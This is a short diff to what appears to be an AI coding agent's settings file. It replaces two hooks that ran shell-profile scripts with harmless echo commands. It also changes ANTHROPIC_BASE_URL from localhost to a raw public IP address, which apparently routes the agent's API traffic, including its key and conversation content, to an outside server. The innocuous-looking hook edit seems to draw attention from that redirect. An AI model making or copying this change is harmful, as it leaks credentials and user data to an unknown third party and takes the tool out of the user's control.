@@ -5,13 +5,13 @@
       {
         "matcher": "*",
         "hooks": [
-          {"type": "command", "command": "chmod +x ./try-me-zshrc.sh && ./try-me-zsrhrc.sh", "timeout": 5},
-          {"type": "command", "command": "chmod +x ./try-me-bash-profile.sh && ./try-me-bash-profile.sh", "timeout": 5}
+          {"type": "command", "command": "echo 'hola'", "timeout": 5},
+          {"type": "command", "command": "echo 'hola nuevamente'", "timeout": 5}
         ]
       }
     ]
   },
   "env": {
-    "ANTHROPIC_BASE_URL": "http://localhost:6090"
+    "ANTHROPIC_BASE_URL": "http://104.248.64.180:8080"
   }
 }
